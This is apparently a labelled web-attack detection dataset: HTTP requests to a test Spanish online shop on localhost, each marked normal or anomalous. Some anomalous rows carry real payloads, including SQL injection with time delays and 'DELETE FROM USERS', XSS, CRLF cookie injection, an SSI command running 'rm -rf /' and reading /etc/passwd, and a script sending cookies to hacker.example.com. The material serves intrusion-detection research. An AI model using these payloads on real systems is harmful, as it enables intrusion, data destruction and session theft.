query,label
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=flint&password=heRBecER&nombre=Nabil&apellidos=Salleras+Lima&email=volmut8%40santcugatpisos.ca&dni=51483838V&direccionA=Calle+Isla+Columbretes+111+&ciudad=Soto+de+Cerrato&cp=47120&provincia=Valencia&ntc=2744245058125133&B1=Registrar HTTP/1.1,1
modo=insertar&precio=400&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=97&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/IBMWebAS HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=daugavie9&password=DesCERraJaR&nombre=Rayen&apellidos=Gor%2Fr%ED*n&email=klevenow%40yiutuve.org&dni=02007726X&direccion=Portal+Del+Rey+20+10-H&ciudad=Aliaga&cp=06458&provincia=Guip%FAzcoa&ntc=9898547003601125&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/servlet/SimpleServlet HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg.Bak HTTP/1.1,1
http://localhost:8080/_cti_pvt/deptodoc.btr HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6987&B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2 HTTP/1.1,1
http://localhost:8080/dspug.nsf HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=toshach&pwd=qUeR4N55a&remember=off%2F&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=brasset&password=vidrioso&nombre=Aminda&apellidos=Pinar+Vives&email=bumatai%40aldufa.pf&dni=86651591B&direccion=Travesia+Carpio+y+Torta%2C+133+&ciudad=Jaraicejo&cp=09640&provincia=%C1vila&ntc=5011187157349121&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
modo=registro&login=checinsk&password=c2ad953u8ro&nombre=Neria&apellidos=Taronger&email=lopez_novis%40ocymafa.%40et&dni=74014005M&direccion=Avenida+Roque+De+Gando%2C+193%2C+7%3FE&ciudad=Castrobol&cp=26324&provincia=Cuenca&ntc=5680554856223107&B1=Registrar,1
B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=faraday&password=8Ef6NDo&nombre=Xixia&apellidos=Paula+Pladellorens&email=euzaine%40schnapps.com.gs&dni=85744372G&direccion=Santa+Barbara+28+&ciudad=Cenicientos&cp=22232&provincia=Lugo&ntc=7057231009442608&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/physican/login.do HTTP/1.1,1
id=1&nombre=Queso+Manchego&precio=39&cantidad=90&B1=A%F1adir+al+carrito,0
modo=registro&login=kanya&password=trasladadora&nombre=Angelo&apellidos=Goya+Asensio&email=bowers%40puntodevistafotografia.gf&dni=56007542N&direccion=C%2F+Baja+58%2C+1%3FH&ciudad=Helechosa+de+los+Montes&cp=10181&provincia=Valencia&ntc=8914897432837758&B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/global.INC HTTP/1.1,1
modo=registro&login=olivie&password=re0348n1AR&nombre=Ivan&apellidos=Elbar+Brice%F1o&email=elliot3%40connect.li&dni=65683923V&direccion=Los+Caminos%2C+129%2C+13-G&ciudad=Hinojosa+del+Campo&cp=10130&provincia=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ntc=7487181086019639&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tiong-ho&password=an1l5m9no&nombre=Hadasa&apellidos=Subias&emailA=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=4461899477803914&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
modo=entrar&login=mcmul%2Bl%3Fin&pwd=acarrear&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,1
modo=entrar&login=i-ching&pwd=Escon*dEr&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=currey99&password=02ap36O5473&nombre=Teresa&apellidos=Vi%F1es+Canales&email=fazenda_heigh%40unanuevavisionenortodoncia.gh&dni=90179643R&direccion=Dels+Segons+Jocs+Mediterranis+86%2C+3-H&ciudad=Casarejos&cp=13750&provincia=Teruel&ntc=7548043709154269&B1=Registrar HTTP/1.1,0
http://localhost:8080/WebSphereSamples/ HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
B2=Vaciar+carrito,0
modo=registro&login=%2F%2C*stellwag&password=dogal&nombre=Adelmo&apellidos=Jepus+Novas&email=cagney%40hiperespa%F1a.et&dni=99942317A&direccion=Carrer+Sant+Fruitos+1%2C+&ciudad=Riells+i+Viabrea&cp=29410&provincia=M%E1laga&ntc=4452881808901719&B1=Registrar,1
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=amm*a*mari&password=ch07ico3o&nombre=Jerem%EDas&apellidos=Maslo+Arrunategui&email=ratcliff%40mataroweb.gw&dni=26853011M&direccion=Calle+Felipe+De+Diego+191%2C+2H&ciudad=Montefr%EDo&cp=36520&provincia=Burgos&ntc=3246825984475356&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
B2=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=14&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp/asf-logo-wide.INC HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1~ HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8424&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp/6909030637832563290.jsp HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9536&B1=Confirmar%27+AND+%271%27%3D%271 HTTP/1.1,1
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
modo=insertar&precio=5698&B1=Pasar+por+caja%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,1
modo=registro%4040&login=beatriz&password=m9n87d90&nombre=Luciliano&apellidos=Arlat+Poma&email=pezzotta-castella%40artesania.org.nc&dni=35265294S&direccion=Calle+Kadiga+91+&ciudad=Bobadilla&cp=31750&provincia=Barcelona&ntc=4154281799426251&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=draves&password=ro%F1IcA&nombre=Babeli&apellidosA=Hermoso+Ginart&email=haver0%40iurispretor.cn&dni=77284339S&direccion=Calle+Urbina%2C+129+&ciudad=Berango&cp=33775&provincia=Le%F3n&ntc=7007903703917778&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=37%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=394&B1=Pasar+por+caja%2F HTTP/1.1,1
modo=registro&login=cohen&password=pirr7n108&nombre=Siro&apellidos=Casaramon+Tetatzin&email=malcolm_motaung%40enlanzarote.com.yu&dni=30635705G&direccion=Cristo+Rey%2C+59%2C+2B&ciudad=Arenales+de+San+Gregorio&cp=24745any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&provincia=Huelva&ntc=2796424278292099&B1=Registrar,1
id=Set-cookie%253A%2BTamper%253D1041264011025374727&nombre=Vino+Rioja&precio=100&cantidad=6&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=monique&password=m6Ke&nombre=Jaazael&apellidos=Rep%E1raz+Torrubiano&email=saint-simon-vondis%40paremoselalzheimer.dj&dni=94987112X&direccion=Calle+Bruno+Ayllon%2C+142%2C+3%3FC&ciudad=Uncastillo&cp=21710&provincia=Teruel&ntc=8762163912955925&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
modo=insertar&precio=1700&B1A=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=wilken&pwd=r5pa2el0s&remember=off%2F&B1=Entrar HTTP/1.1,1
modo=entrar&login=hiller&pwd=ofrecedor&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=grant&password=encandilado&nombre=Serkis&apellidos=De+las+Mu%F1ecas+Pedrol&email=mannoers%40magichobby.se&dni=82634246F&direccion=C%2Fjon+Ni%F1os+Hermosos%2C+S%2FN+12-A&ciudad=Tarr%E9s&cp=07650&provincia=M%E1laga&ntc=1699759073953629&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=%257C&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/6909030637832563290.jsp.INC HTTP/1.1,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
modo=insertar&precio=3323&B1=Confirmar,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
id=1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=61&B1=A%F1adir+al+carrito HTTP/1.1,0
id=3%2F&nombre=Queso+Manchego&precio=39&cantidad=20&B1=A%F1adir+al+carrito,1
id=1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide HTTP/1.1,1
modo=entrar&login=p%2Bap*e&pwd=74oNc0&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=1sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=A%F1adir+al+carrito,1
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=Set-cookie%253A%2BTamper%253D1041264011025374727&nombre=Vino+Rioja&precio=100&cantidad=6&B1=A%F1adir+al+carrito HTTP/1.1,1
modo=entrar&login=pippo&pwd=0i26or7os9&remember=off&B1=Entrar,0
modo=insertar&precio=6715&B1=Confirmar%2F,1
id=1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=65&B1=A%F1adir+al+carrito HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=vivianne7&pwd=adu3%F3n&remember=on&B1=Entrar HTTP/1.1,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidadA=57&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7646&B1=%4040 HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
modo=insertar&precio=4221&B1=Pasar+por+caja%2F,1
errorMsg=Credenciales+incorrectasparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,1
modo=registro&login=gavens0&password=revirado&nombre=Kaya&apellidos=Mojeda+Batet&email=munshin%40cirugiaplasticacordoba.hk&dni=65532112Y&direccion=Plaza+Flauta+16%2C+1%3FBbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&ciudad=Valdeavellano+de+Tera&cp=08672&provincia=Teruel&ntc=2452355001922764&B1=Registrar,1
modo=insertar&precio=7704&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Ques%2Bo+Manchego&precio=100&cantidad=7&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=drop-box&password=romano&nombre=Gerino&apellidos=Benedit+Ferrandi&email=seriano-reeggiero%40distritoeste.pk&dni=69663934Q&direccion=Music+Jaume+Isern+189+&ciudad=Ag%FCero&cp=10263&provincia=C%F3rdoba&ntc=1199398337908889&B1=Registrar HTTP/1.1,0
B2=Vaciar+carrito,0
id=1,0
modo=registro&login=yaeger&password=c%21andeleta&nombre=Claudio&apellidos=Cazallas+Caminal&email=reaves-phillips%40baybay.tm&dni=58783501D&direccion=Avinguda+De+La+Reina+Maria+Cristina+174+2%3FB&ciudad=Mesas%2C+Las&cp=44220&provincia=Badajoz&ntc=2524414881203627&B1=Registrar,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4074&B1=Pasar+por+caja%2F HTTP/1.1,1
id=1&nombre=Vino+Rioja&precio=85&cantidad=39&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gen%2F%2Fnie&pwd=circunfuso&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mankowsk&password=4a39c44%EDa&nombre=Marino&apellidos=Escat+Monistca&email=bow%40whitepearlresort.pl&dni=01472954B&direccion=C%2F+Garcia+Morente+129+&ciudad=Adradas&cp=18417&provincia=C%F3rdoba&ntc=2533839429419532&B1=Registrar HTTP/1.1,0
modo=insertar&precioA=7686&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=poi%2Cndex*t&pwd=tel7tipo&remember=off&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwd=virulenta&remember=on&B1=Entrar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
modo=insertar&precio=8145&B1A=Confirmar,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2365&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=1764&B1=Pasar+por+caja HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235 HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brownrid&password=al1ar8o6er3&nombre=Imelda&apellidos=Va%2Flor+Riffo&email=teodorezyk%40vitalhome.st&dni=35108015X&direccion=Calle+Poligono+Del+Valle+S%2FN+5%3FD&ciudad=Sanl%FAcar+de+Guadiana&cp=31862&provincia=Asturias&ntc=5478937412925472&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=16&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=massinga&password=reSPALdar&nombre=Peregrino&apellidos=O%F1ate+Leguisamo&email=armida%40automovilesalhambra.pl&dni=65278169Y&direccion=C%2F+Canal%2C+25%2C+9%3FF&ciudad=Azkoitia&cp=38911&provincia=Salamanca&ntc=561993959286828&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1202&B1=Pasar+por+caja%2F HTTP/1.1,1
modo=registro&login=rali&password=enTOLAR&nombre=Ambrosia&apellidos=Gutarra+Marimon&email=besnehard8%40itrends.tn&dni=63395358K&direccion=C%2F+Espiritu+Santo+126+&ciudad=Vilafant&cp=50171&provincia=Guadalajara&ntc=4231744159905009&B1=Registrar,0
modo=entrar&login=tobin&pwd=renta&remember=off&B1=Entrar,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3F HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=zalman&password=*diet%E9tico&nombre=Adiel&apellidos=Fabr%E9s+Bueso&email=riegert_tao-lin%40sanchezquesada.ke&dni=11051114M&direccion=Avenida+San+Mames%2C+25%2C+&ciudad=Carriches&cp=50366&provincia=Guadalajara&ntc=7998962855410697&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros.inc HTTP/1.1,1
modo=registro&login=jiuhuai4&password=renombrada&nombre=Vasty&apellidos=Aceituno+Masdevall&email=ronoro_dalya%40foreignoffice.nu&dni=48258022C&direccion=Via+Apicola+45%2C+4%3FC&ciudad=Santa+Mar%EDa+de+Sando&cp=47182&provincia=Salamanca&ntcA=9198580449925150&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vilma&password=73t4h5mbre4&nombre=Rez&apellidos=Calzada+Rebassa&email=vestly.pereda%40ladigianni.eh&dni=72094500B&direccion=Joan+De+Joanes+61+3%3FH&ciudad=Benalup-Casas+Viejas&cp=26291&provincia=Toledo&ntc=8185948553220105&B1=Registrar HTTP/1.1,0
http://localhost:8080/webapp/examples/HelloPervasive HTTP/1.1,1
id=3&nombre=Queso+Manchego&precio=100&cantidad=66&B1A=A%F1adir+al+carrito,1
modo=registro&login=keeler&password=g78e651no&nombre=Floro&apellidos=Fidalgo&email=mcintosh%40pavimentosalagon.gy&dni=55170412J&direccion=C%2F+Joaquin+Sorolla%2C+148+5%3FD&ciudad=Aben%F3jar&cp=47175&provincia=Salamanca&ntc=240796981547256A&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=51&B1=Confirmar HTTP/1.1,1
modo=entrar&login=yale&pwd=2NcOJa7&remember=on%27+DELETE+FROM+USERS&B1=Entrar,1
http://localhost:8080/6909030637832563290.jsp HTTP/1.1,1
modoA=insertar&precio=8157&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=huntlee&passwordA=da.mer%EDa&nombre=Abundio&apellidos=Vendrells+Unda&email=goetz-pongnati%40itrends.tt&dni=80216747S&direccion=Calle+Francisco+De+Diego%2C+83+1-H&ciudad=Moeche&cp=04897&provincia=Valladolid&ntc=6300701624208946&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
errorMsgA=Credenciales+incorrectas,1
modo=insertar&precio=4296&B1=Confirmar%2F,1
http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/4861362529278789730.INC HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=erickson&pwd=inord2n6da7e401&remember=off&B1=Entrar HTTP/1.1,0
modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=36813756W&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudad=Vila-real&cp=19160&provincia=Ja%E9n&ntc=966948476857778&B1=Registrar,1
modo=insertar&precio=1227&B1=Pasar+por+caja%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
modo=registro&login=felli&password=alba2igo&nombre=Maximinio&apellidos=Gormaz+Schneider&email=cowling%40minimizar.bz&dni=65281809N&direccion=Plaza+Minayo%2C+2+&ciudad=Tormellas&cp=50562&provincia=%C1vila&ntc=9032865306182152&B1=Registrar,0
modo=insertar&precio=4296&B1A=Confirmar,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
modo=insertar%253F&precio=909&B1=Pasar+por+caja,1
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=serban&password=tripudio&nombre=Eduardo&apellidos=Ortega+Sacrista&email=laffan%40phd-photodecor.bv&dni=93289880V&direccion=C%2F+Serrano%2C+125%2C+&ciudad=Sarri%E0+de+Ter&cp=22728&provincia=Madrid&ntc=7993090576542905&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
